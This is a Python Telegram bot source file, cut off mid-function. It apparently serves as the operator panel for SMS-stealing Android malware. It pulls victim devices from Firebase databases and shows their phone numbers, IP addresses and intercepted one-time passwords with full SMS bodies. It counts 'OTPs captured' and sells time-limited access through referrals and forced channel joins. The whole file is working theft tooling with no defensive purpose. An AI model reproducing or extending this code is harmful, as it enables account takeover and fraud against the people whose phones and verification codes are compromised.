# language: Python, file: bot.py, runtime: 3.10+
import asyncio
import logging
from datetime import datetime
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardRemove,
    ReplyKeyboardMarkup,
    KeyboardButton,
    KeyboardButtonRequestChat,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
    ChatJoinRequestHandler,
)
from config import BOT_TOKEN, ADMIN_IDS, BOT_NAME, PAGE_SIZE, FORCE_CHANNEL, FORCE_CHANNEL_LINK, REFERRAL_HOURS, START_BONUS_MINUTES
import database as db
from firebase_client import get_devices, get_all_otps, aggregate_all_accounts

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

# Conversation states
(
    ADD_NAME, ADD_URL, ADD_KEY, 
    GRANT_ID, GRANT_HOURS, 
    CH_SELECT, CH_MODE, CH_CUSTOM_LINK, 
    BROADCAST_MSG, 
    SET_BONUS_MINS
) = range(10)

# ---------- helpers ----------

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def access_ok(uid: int) -> bool:
    return db.check_access(uid, ADMIN_IDS)

def _all_force_channels() -> list:
    chans = list(db.list_force_channels())
    if FORCE_CHANNEL:
        exists = any(str(c.get("username")) == str(FORCE_CHANNEL) for c in chans)
        if not exists:
            link = FORCE_CHANNEL_LINK or ""
            if not link and str(FORCE_CHANNEL).startswith("@"):
                link = f"https://t.me/{str(FORCE_CHANNEL).lstrip('@')}"
            chans = [{"id": "ch_env", "username": FORCE_CHANNEL, "link": link, "mode": "normal", "title": FORCE_CHANNEL}] + chans
    return chans

def _normalize_chat_id(ch):
    ch = str(ch or "").strip()
    if not ch:
        return ch
    if ch.lstrip("-").isdigit():
        try:
            return int(ch)
        except ValueError:
            return ch
    return ch

async def check_membership_detail(bot, uid: int) -> tuple[bool, list[str]]:
    chans = _all_force_channels()
    if not chans:
        return True, []
    problems = []
    for c in chans:
        ch_raw = str(c.get("chat_id") or c.get("username") or "").strip()
        if not ch_raw:
            continue
        chat_id = _normalize_chat_id(ch_raw)
        mode = c.get("mode", "normal")
        
        if mode == "request" and db.has_requested(uid, chat_id):
            continue 
            
        try:
            m = await bot.get_chat_member(chat_id, uid)
            st = m.status
            
            if st in ("member", "administrator", "creator"):
                if mode == "request": db.clear_join_request(uid, chat_id)
                continue
                
            if mode == "request" and st in ("left", "restricted"):
                problems.append(f"❌ Request not found: {c.get('title', ch_raw)}. Click Request and send request.")
                continue 
            
            if st == "left":
                problems.append(f"❌ Not joined: {c.get('title', ch_raw)}")
            elif st == "kicked":
                problems.append(f"❌ Banned from: {c.get('title', ch_raw)}")
            else:
                problems.append(f"❌ Status `{st}` on {c.get('title', ch_raw)}")
        except Exception as e:
            err = str(e)
            if "user not found" in err.lower() and mode == "request":
                problems.append(f"❌ Request not found: {c.get('title', ch_raw)}. Click Request and send request.")
            else:
                problems.append(f"⚠️ Error {c.get('title', ch_raw)}: {err[:40]}")
    return (len(problems) == 0), problems

async def is_member(bot, uid: int) -> bool:
    ok, _ = await check_membership_detail(bot, uid)
    return ok

def force_join_kb() -> InlineKeyboardMarkup:
    chans = _all_force_channels()
    rows = []
    for i, c in enumerate(chans, 1):
        link = c.get("link") or ""
        uname = str(c.get("username") or "")
        title = c.get("title") or uname
        mode = c.get("mode", "normal")
        
        if not link and uname.startswith("@"):
            link = f"https://t.me/{uname.lstrip('@')}"
        
        label = f"📢 Join: {title}"
        if mode == "request":
            label = f"🛡 Request to Join: {title}"
            
        if link:
            rows.append([InlineKeyboardButton(label, url=link)])
            
    rows.append([InlineKeyboardButton("✅ I Sent Request / Joined", callback_data="check_join")])
    return InlineKeyboardMarkup(rows)

def page_keyboard(page: int, total_pages: int, prefix: str = "page") -> InlineKeyboardMarkup:
    buttons = []
    row = []
    start = max(1, page - 2)
    end = min(total_pages, page + 2)
    if page > 1:
        row.append(InlineKeyboardButton("«", callback_data=f"{prefix}:1"))
        row.append(InlineKeyboardButton("‹", callback_data=f"{prefix}:{page-1}"))
    for p in range(start, end + 1):
        label = f"[{p}]" if p == page else str(p)
        row.append(InlineKeyboardButton(label, callback_data=f"{prefix}:{p}"))
    if page < total_pages:
        row.append(InlineKeyboardButton("›", callback_data=f"{prefix}:{page+1}"))
        row.append(InlineKeyboardButton("»", callback_data=f"{prefix}:{total_pages}"))
    buttons.append(row)
    buttons.append([
        InlineKeyboardButton("🏠 Menu", callback_data="menu"),
        InlineKeyboardButton("🔄 Refresh", callback_data=f"{prefix}:{page}"),
    ])
    return InlineKeyboardMarkup(buttons)

def device_grid_keyboard(devices: list, page: int) -> InlineKeyboardMarkup:
    total = len(devices)
    total_pages = max(1, (total + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(1, min(page, total_pages))
    start = (page - 1) * PAGE_SIZE
    chunk = devices[start: start + PAGE_SIZE]

    buttons = []
    row = []
    for d in chunk:
        status = "🟢" if d.get("online") else "🔴"
        phone = str(d.get("phone") or d["id"])[-10:]
        label = f"{status} {phone} 🔑"
        row.append(InlineKeyboardButton(label, callback_data=f"dev:{d['fb_id']}:{d['id']}:{page}"))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)

    buttons.append([
        InlineKeyboardButton(f"📄 {page}/{total_pages}", callback_data=f"pageselect:{page}"),
        InlineKeyboardButton("▶️", callback_data=f"page:{min(page+1, total_pages)}"),
    ])
    buttons.append([
        InlineKeyboardButton("🏠 Menu", callback_data="menu"),
        InlineKeyboardButton("🔄 Refresh", callback_data=f"page:{page}"),
    ])
    return InlineKeyboardMarkup(buttons)


def pageselect_keyboard(total_pages: int, current: int, block: int = 0) -> InlineKeyboardMarkup:
    per_block = 25
    total_blocks = max(1, (total_pages + per_block - 1) // per_block)
    block = max(0, min(block, total_blocks - 1))
    start = block * per_block + 1
    end = min(total_pages, start + per_block - 1)

    buttons = []
    row = []
    for p in range(start, end + 1):
        label = f"[{p}]" if p == current else str(p)
        row.append(InlineKeyboardButton(label, callback_data=f"page:{p}"))
        if len(row) == 5:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)

    nav = []
    if block > 0:
        nav.append(InlineKeyboardButton("« Prev", callback_data=f"pageselect:{current}:{block-1}"))
    nav.append(InlineKeyboardButton(f"Pages {start}-{end}", callback_data="noop"))
    if block < total_blocks - 1:
        nav.append(InlineKeyboardButton("Next »", callback_data=f"pageselect:{current}:{block+1}"))
    buttons.append(nav)
    buttons.append([
        InlineKeyboardButton("🏠 Menu", callback_data="menu"),
        InlineKeyboardButton(f"« Back p.{current}", callback_data=f"page:{current}"),
    ])
    return InlineKeyboardMarkup(buttons)

def main_menu_keyboard(uid: int) -> InlineKeyboardMarkup:
    rows = [
        [
            InlineKeyboardButton("📱 Online Devices", callback_data="page:1"),
            InlineKeyboardButton("📊 Statistics", callback_data="stats"),
        ],
        [
            InlineKeyboardButton("🔗 Referral", callback_data="referral"),
            InlineKeyboardButton("🔑 KEY SYSTEM", callback_data="keysys"),
        ],
        [
            InlineKeyboardButton("🔄 Refresh", callback_data="menu"),
        ],
    ]
    if is_admin(uid):
        rows.append([
            InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin"),
        ])
    return InlineKeyboardMarkup(rows)

def admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Firebase DB", callback_data="admin_add")],
        [InlineKeyboardButton("📋 List Databases", callback_data="admin_list")],
        [InlineKeyboardButton("👤 Grant Access", callback_data="admin_grant")],
        [InlineKeyboardButton("📢 Force Channel", callback_data="admin_channel")],
        [InlineKeyboardButton("🔗 Referral Settings", callback_data="admin_refset")],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🎁 Set Welcome Bonus", callback_data="admin_set_bonus")],
        [InlineKeyboardButton("« Back", callback_data="menu")],
    ])

# ---------- commands ----------

# NAYA /users COMMAND
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    users = db.get_all_users()
    total = len(users)
    await update.message.reply_text(
        f"👥 *Total Users:* `{total}`",
        parse_mode="Markdown"
    )

async def handle_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    req = update.chat_join_request
    if req:
        db.save_join_request(req.from_user.id, req.chat.id)
        log.info(f"Join request received from {req.from_user.id} for chat {req.chat.id}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    name = update.effective_user.first_name or "User"

    if context.args:
        arg = context.args[0]
        if arg.startswith("ref_"):
            try:
                ref_id = int(arg.split("_", 1)[1])
                linked = db.register_referral(uid, ref_id)
                if linked and ref_id != uid:
                    hours = float(db.get_settings().get("referral_hours") or REFERRAL_HOURS or 1)
                    db.add_hours(ref_id, hours)
                    try:
                        await context.bot.send_message(
                            ref_id,
                            f"🎉 New referral! +{hours}h access\nFrom: {name} (`{uid}`)",
                            parse_mode="Markdown",
                        )
                    except Exception:
                        pass
            except ValueError:
                pass
    else:
        db.mark_user_seen(uid)

    db.mark_user_seen(uid)

    if not await is_member(context.bot, uid):
        chans = _all_force_channels()
        has_request = any(c.get("mode") == "request" for c in chans)
        
        msg = "🔒 *Join the channel first* to use this bot.\n\n"
        if has_request:
            msg += "⚠️ *Note:* The channel is in Request Mode. Click the button below, press *Request to Join*, then come back and click Check.\n\n"
        msg += "After sending request, tap *I Sent Request*."
        
        await update.message.reply_text(
            msg,
            parse_mode="Markdown",
            reply_markup=force_join_kb(),
        )
        return

    if not is_admin(uid):
        mins = float(db.get_settings().get("start_bonus_minutes") or START_BONUS_MINUTES or 10)
        if db.grant_start_bonus(uid, mins):
            try:
                await update.message.reply_text(
                    f"🎁 Welcome! *{int(mins)} minutes* free access mil gaya.\nUse Online Devices abhi.",
                    parse_mode="Markdown",
                )
            except Exception:
                pass

    if not access_ok(uid):
        me = await context.bot.get_me()
        link = f"https://t.me/{me.username}?start=ref_{uid}"
        await update.message.reply_text(
            f"🔒 *Access required*\n\n"
            f"Your ID: `{uid}`\n\n"
            f"Ask admin for access, or share your referral link to earn hours:\n"
            f"`{link}`",
            parse_mode="Markdown",
        )
        return

    accounts = db.list_firebase()
    left = db.get_access_left(uid) if not is_admin(uid) else "∞"
    online_count = 0
    total_count = 0
    total_otps = 0
    
    if accounts:
        try:
            devs, total_otps = await aggregate_all_accounts(accounts)
            online_count = sum(1 for d in devs if d.get("online"))
            total_count = len(devs)
            context.application.bot_data["last_devices"] = devs
            context.application.bot_data["last_total"] = total_count
            db.update_stats(total_count, total_otps)
        except Exception as e:
            log.warning("start fetch: %s", e)

    text = (
        f"🤖 *{BOT_NAME}*\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"👋 Hey, {name}!\n"
        f"⏱ Access › ✅ {left}\n\n"
        f"📡 *Live Status*\n"
        f"🟢 Online  {online_count} devices\n"
        f"📱 Total   {total_count} devices\n"
        f"🔑 OTPs    {total_otps}\n"
        f"🔥 Firebase {len(accounts)} DB\n\n"
        f"🕐 Last sync: {datetime.now().strftime('%H:%M:%S')} · auto 30s"
    )
    await update.message.reply_text(
        text,
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(uid),
    )

async def menu_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not await is_member(context.bot, uid):
        await q.edit_message_text("🔒 Join the channel first.", reply_markup=force_join_kb())
        return
    if not access_ok(uid):
        await q.edit_message_text("🔒 Access expired. Use Referral or ask admin.")
        return

    accounts = db.list_firebase()
    left = db.get_access_left(uid) if not is_admin(uid) else "∞"
    online_count = 0
    total_count = 0
    total_otps = 0
    devs = []
    if accounts:
        try:
            devs, total_otps = await aggregate_all_accounts(accounts)
            online_count = sum(1 for d in devs if d.get("online"))
            total_count = len(devs)
            context.application.bot_data["last_devices"] = devs
            context.application.bot_data["last_total"] = len(devs)
            db.update_stats(len(devs), total_otps)
        except Exception:
            pass

    text = (
        f"🤖 *{BOT_NAME}*\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"👋 Hey, {q.from_user.first_name}!\n"
        f"⏱ Access › ✅ {left}\n\n"
        f"📡 *Live Status*\n"
        f"🟢 Online  {online_count} devices\n"
        f"📱 Total   {total_count} devices\n"
        f"🔑 OTPs    {total_otps}\n"
        f"🔥 Firebase {len(accounts)} DB\n\n"
        f"🕐 Last sync: {datetime.now().strftime('%H:%M:%S')} · auto 30s"
    )
    await q.edit_message_text(
        text,
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(uid),
    )

async def page_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not await is_member(context.bot, uid):
        await q.edit_message_text("🔒 Join the channel first.", reply_markup=force_join_kb())
        return
    if not access_ok(uid):
        await q.edit_message_text("🔒 Access expired.")
        return

    parts = q.data.split(":")
    if len(parts) >= 2 and parts[1] == "all":
        page = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 1
    else:
        try:
            page = int(parts[1])
        except Exception:
            page = 1
    accounts = db.list_firebase()
    if not accounts:
        await q.edit_message_text(
            "📭 No Firebase databases added yet.\nAdmin must add DB first.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu", callback_data="menu")]]),
        )
        return

    await q.edit_message_text("⏳ Syncing devices…")
    try:
        all_devices, _ = await aggregate_all_accounts(accounts)
    except Exception as e:
        await q.edit_message_text(f"❌ Fetch error: {e}")
        return

    show_all = False
    if ":" in q.data:
        parts = q.data.split(":")
        if len(parts) >= 2 and parts[1] == "all" and is_admin(uid):
            show_all = True
            page = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 1
    devices = all_devices if show_all else [d for d in all_devices if d.get("online")]
    context.user_data["show_all"] = show_all

    if not devices:
        await q.edit_message_text(
            "📭 No *online* devices right now.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu", callback_data="menu")]]),
        )
        return

    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(1, min(page, total_pages))

    text = (
        f"📱 *Online Devices* · {len(devices)} active\n"
        f"🕐 Sync: {datetime.now().strftime('%H:%M:%S')}\n"
        f"📄 Page {page}/{total_pages}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"Select a device:"
    )
    await q.edit_message_text(
        text,
        parse_mode="Markdown",
        reply_markup=device_grid_keyboard(devices, page),
    )

async def pageselect_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not await is_member(context.bot, uid):
        await q.edit_message_text("🔒 Join the channel first.", reply_markup=force_join_kb())
        return
    if not access_ok(uid):
        await q.edit_message_text("🔒 Access expired.")
        return

    parts = q.data.split(":")
    current = int(parts[1]) if len(parts) > 1 else 1
    block = int(parts[2]) if len(parts) > 2 else max(0, (current - 1) // 25)

    accounts = db.list_firebase()
    if not accounts:
        await q.edit_message_text("No databases.")
        return
    try:
        all_devices, _ = await aggregate_all_accounts(accounts)
    except Exception as e:
        await q.edit_message_text(f"❌ {e}")
        return
    devices = [d for d in all_devices if d.get("online")]
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    current = max(1, min(current, total_pages))

    text = (
        f"📄 *Page Select karo*\n"
        f"Total *{total_pages}* pages available hai\n"
        f"Online devices: {len(devices)}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"Page number pe click karo:"
    )
    await q.edit_message_text(
        text,
        parse_mode="Markdown",
        reply_markup=pageselect_keyboard(total_pages, current, block),
    )

async def noop_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()

async def device_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not access_ok(uid):
        await q.edit_message_text("🔒 Access expired.")
        return

    parts = q.data.split(":")
    fb_id = parts[1]
    dev_id = parts[2]
    from_page = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 1
    context.user_data["devices_page"] = from_page
    acc = db.get_firebase(fb_id)
    if not acc:
        await q.edit_message_text("DB not found.")
        return

    await q.edit_message_text("⏳ Loading device…")
    devices = await get_devices(acc["url"], acc["key"], with_otp=False)
    dev = next((d for d in devices if d["id"] == dev_id), None)
    if not dev:
        await q.edit_message_text("Device offline / not found.")
        return
    try:
        otps = await get_all_otps(acc["url"], acc["key"], dev_id)
        if otps:
            top = next((o for o in otps if o.get("otp")), otps[0])
            if top.get("otp"):
                dev["otp_code"] = str(top["otp"])
                dev["otp_sender"] = top.get("sender")
                dev["otp_time"] = top.get("time")
    except Exception:
        pass

    otp_line = "—"
    if dev.get("otp_code"):
        otp_line = (
            f"CODE › `{dev['otp_code']}`\n"
            f"Sender › {dev.get('otp_sender') or '?'}\n"
            f"Time › {dev.get('otp_time') or '-'}"
        )

    text = (
        f"📱 *DEVICE INFO*\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📱 Model › *{dev.get('model') or dev.get('id')}*\n"
        f"📞 Number › `{dev.get('phone')}`\n"
        f"🔋 Battery › {dev.get('battery')}%\n"
        f"🤖 Android › {dev.get('android')}\n"
        f"📡 Network › {dev.get('network')}\n"
        f"🌐 IP › `{dev.get('ip')}`\n"
        f"🟢 Online › {'Yes' if dev.get('online') else 'No'}\n"
        f"🕐 Last Seen › {dev.get('last_seen')}\n"
        f"🔥 Database › {acc.get('name')}\n"
        f"\n🔑 *LATEST OTP*\n"
        f"{otp_line}"
    )
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Check OTP", callback_data=f"otp:{fb_id}:{dev_id}"),
            InlineKeyboardButton("📩 All OTPs", callback_data=f"allotp:{fb_id}:{dev_id}"),
        ],
        [
            InlineKeyboardButton("« Back", callback_data=f"page:{context.user_data.get('devices_page', 1)}"),
            InlineKeyboardButton("🏠 Menu", callback_data="menu"),
        ],
    ])
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)

async def otp_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer("Checking latest OTP…")
    uid = q.from_user.id
    if not access_ok(uid):
        await q.answer("Access expired", show_alert=True)
        return
    parts = q.data.split(":")
    fb_id, dev_id = parts[1], parts[2]
    acc = db.get_firebase(fb_id)
    if not acc:
        await q.answer("DB missing", show_alert=True)
        return

    otps = await get_all_otps(acc["url"], acc.get("key") or "", dev_id)
    devices = await get_devices(acc["url"], acc.get("key") or "", with_otp=False)
    dev = next((d for d in devices if d["id"] == dev_id), None)
    phone = (dev or {}).get("phone") or dev_id

    top = None
    if otps:
        top = next((o for o in otps if o.get("otp")), None) or otps[0]

    if not top or not top.get("otp"):
        text = (
            "⚡ *OTP ALERT* ⚡\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📭 No new OTP found yet.\n"
            "Tap Check OTP again in a few seconds.\n\n"
            f"📞 `{phone}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    else:
        code = top.get("otp") or "—"
        sender = top.get("sender") or "?"
        when = top.get("time") or "-"
        body = (top.get("body") or "").strip()
        if len(body) > 280:
            body = body[:277] + "…"
        text = (
            "⚡ *OTP ALERT* ⚡\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔢  `{code}`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📞 `{phone}`\n"
            f"📤 {sender}\n"
            f"🕐 {when}\n"
            "──────────────────────────────\n"
            f"💬 {body}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )

    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔄 Check Again", callback_data=f"otp:{fb_id}:{dev_id}"),
            InlineKeyboardButton("📩 All OTPs", callback_data=f"allotp:{fb_id}:{dev_id}"),
        ],
        [
            InlineKeyboardButton("« Back", callback_data=f"dev:{fb_id}:{dev_id}"),
            InlineKeyboardButton("🏠 Menu", callback_data="menu"),
        ],
    ])
    try:
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
    except Exception:
        await q.answer(f"OTP: {top.get('otp') if top else '—'}", show_alert=True)

async def allotp_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not access_ok(uid):
        return
    parts = q.data.split(":")
    fb_id, dev_id = parts[1], parts[2]
    acc = db.get_firebase(fb_id)
    if not acc:
        await q.edit_message_text("DB missing")
        return
    otps = await get_all_otps(acc["url"], acc["key"], dev_id)
    if not otps:
        text = "📭 No OTP history found for this device."
    else:
        lines = ["📩 *All OTPs*\n━━━━━━━━━━━━━━━━"]
        for o in otps[:30]:
            code = o.get("otp") or "—"
            lines.append(
                f"`{code}` · {o.get('sender')} · {o.get('time')}\n"
                f"_{str(o.get('body', ''))[:60]}_"
            )
        text = "\n".join(lines)
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("« Back", callback_data=f"dev:{fb_id}:{dev_id}")],
        [InlineKeyboardButton("🏠 Menu", callback_data="menu")],
    ])
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)

async def stats_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not access_ok(uid):
        return
    accounts = db.list_firebase()
    try:
        devices, otps = await aggregate_all_accounts(accounts)
    except Exception:
        devices, otps = [], 0
    online = sum(1 for d in devices if d.get("online"))
    text = (
        f"📊 *Statistics*\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📱 Total devices: {len(devices)}\n"
        f"🟢 Online: {online}\n"
        f"🔴 Offline: {len(devices) - online}\n"
        f"🔑 OTPs captured: {otps}\n"
        f"🔥 Firebase DBs: {len(accounts)}\n"
        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    await q.edit_message_text(
        text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu", callback_data="menu")]]),
    )

async def keysys_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    left = db.get_access_left(uid) if not is_admin(uid) else "Unlimited (admin)"
    text = (
        f"🔑 *KEY SYSTEM*\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"Your ID: `{uid}`\n"
        f"Access left: *{left}*\n\n"
        f"Admin grants time-based access.\n"
        f"Share your ID to get a key."
    )
    await q.edit_message_text(
        text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu", callback_data="menu")]]),
    )

# ---------- admin ----------

async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        await q.answer("Admin only", show_alert=True)
        return ConversationHandler.END
    context.user_data.clear()
    try:
        await q.edit_message_text(
            "⚙️ *Admin Panel*\n━━━━━━━━━━━━━━━━\nManage Firebase DBs & user access.",
            parse_mode="Markdown",
            reply_markup=admin_keyboard(),
        )
    except Exception:
        pass
    return ConversationHandler.END

async def admin_list_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    accounts = db.list_firebase()
    if not accounts:
        text = "📋 *Firebase Databases*\n━━━━━━━━━━━━━━━━\n\nNo databases yet.\nUse *Add Firebase DB*."
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add Firebase DB", callback_data="admin_add")],
            [InlineKeyboardButton("« Back", callback_data="admin")],
        ])
    else:
        lines = [f"📋 *Firebase Databases* ({len(accounts)})\n━━━━━━━━━━━━━━━━\nTap 🗑 to delete:"]
        buttons = []
        for i, a in enumerate(accounts, 1):
            url_short = a["url"].replace("https://", "").replace("-default-rtdb.firebaseio.com", "")[:28]
            lines.append(f"{i}. *{a['name']}*\n`{url_short}`")
            buttons.append([
                InlineKeyboardButton(f"🗑 Delete: {a['name'][:20]}", callback_data=f"admin_delask:{a['id']}")
            ])
        text = "\n".join(lines)
        buttons.append([InlineKeyboardButton("« Back", callback_data="admin")])
        kb = InlineKeyboardMarkup(buttons)
    try:
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
    except Exception:
        pass

async def admin_delask_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    fb_id = q.data.split(":", 1)[1]
    acc = db.get_firebase(fb_id)
    if not acc:
        await q.answer("Already removed", show_alert=True)
        await admin_list_cb(update, context)
        return
    text = (
        f"⚠️ *Delete database?*\n━━━━━━━━━━━━━━━━\n"
        f"Name: *{acc['name']}*\n"
        f"URL: `{acc['url']}`\n\n"
        f"Devices from this DB will disappear from the list."
    )
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Yes, Delete", callback_data=f"admin_del:{fb_id}"),
            InlineKeyboardButton("❌ Cancel", callback_data="admin_list"),
        ]
    ])
    try:
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
    except Exception:
        pass

async def admin_del_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    fb_id = q.data.split(":", 1)[1]
    acc = db.get_firebase(fb_id)
    name = acc["name"] if acc else fb_id
    ok = db.remove_firebase(fb_id)
    await q.answer(f"Deleted {name}" if ok else "Not found", show_alert=True)
    await admin_list_cb(update, context)

async def admin_add_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        await q.answer("Admin only", show_alert=True)
        return ConversationHandler.END
    context.user_data.clear()
    context.user_data["adding_fb"] = True
    try:
        await q.edit_message_text(
            "➕ *Add Firebase DB*\n\nSend a *name* for this database (e.g. Firebase 9):\n\n/cancel to abort",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_cancel")]]),
        )
    except Exception:
        pass
    return ADD_NAME

async def admin_add_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return ADD_NAME
    name = update.message.text.strip()
    if not name:
        await update.message.reply_text("Name empty. Send a name:")
        return ADD_NAME
    if "firebaseio.com" in name or name.startswith("http"):
        short = name.rstrip("/").split("//")[-1].split(".")[0][:24]
        name = short or "DB"
    context.user_data["fb_name"] = name
    await update.message.reply_text(
        "Send Firebase *Database URL*\n"
        "(e.g. `https://xxx-default-rtdb.firebaseio.com`)\n\n"
        "/cancel to abort",
        parse_mode="Markdown",
    )
    return ADD_URL

async def admin_add_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return ADD_URL
    url = update.message.text.strip().rstrip("/").split("?")[0]
    url = "".join(url.split())
    if "firebaseio.com" not in url and "firebasedatabase.app" not in url:
        await update.message.reply_text(
            "❌ Not a Firebase URL.\n"
            "Need something like:\n"
            "`https://PROJECT-default-rtdb.firebaseio.com`\n\n"
            "Send again or /cancel"
        )
        return ADD_URL
    if not url.startswith("http"):
        url = "https://" + url
    context.user_data["fb_url"] = url
    await update.message.reply_text(
        "Send *Database Secret* / API key\n"
        "(Firebase Console → Project Settings → Service Accounts → Database secrets)\n\n"
        "Or send `none` if rules are public.\n\n"
        "/cancel to abort",
        parse_mode="Markdown",
    )
    return ADD_KEY

async def admin_add_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return ADD_KEY
    key = update.message.text.strip()
    if key.lower() in ("none", "null", "public", "-"):
        key = ""
    name = context.user_data.get("fb_name") or "DB"
    url = context.user_data.get("fb_url") or ""
    if not url:
        await update.message.reply_text("❌ URL missing. Start again from Admin Panel.")
        context.user_data.clear()
        return ConversationHandler.END
    ok = db.add_firebase(name, url, key)
    context.user_data.clear()
    if ok:
        await update.message.reply_text(
            f"✅ *Added*\nName: *{name}*\nURL: `{url}`\nKey: `{'(none/public)' if not key else key[:8]+'…'}`",
            parse_mode="Markdown",
            reply_markup=admin_keyboard(),
        )
    else:
        await update.message.reply_text(
            "⚠️ This URL already exists in the list.",
            reply_markup=admin_keyboard(),
        )
    return ConversationHandler.END

async def admin_cancel_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer("Cancelled")
    context.user_data.clear()
    if not is_admin(q.from_user.id):
        return ConversationHandler.END
    try:
        await q.edit_message_text(
            "⚙️ *Admin Panel*\n━━━━━━━━━━━━━━━━\nManage Firebase DBs & user access.",
            parse_mode="Markdown",
            reply_markup=admin_keyboard(),
        )
    except Exception:
        pass
    return ConversationHandler.END

async def admin_grant_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    try:
        await q.edit_message_text(
            "👤 *Grant Access*\n\nSend the user's Telegram *ID* (number):",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin")]]),
        )
    except Exception:
        pass
    return GRANT_ID

async def admin_grant_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("Invalid ID. Numbers only.")
        return GRANT_ID
    context.user_data["grant_uid"] = uid
    await update.message.reply_text(
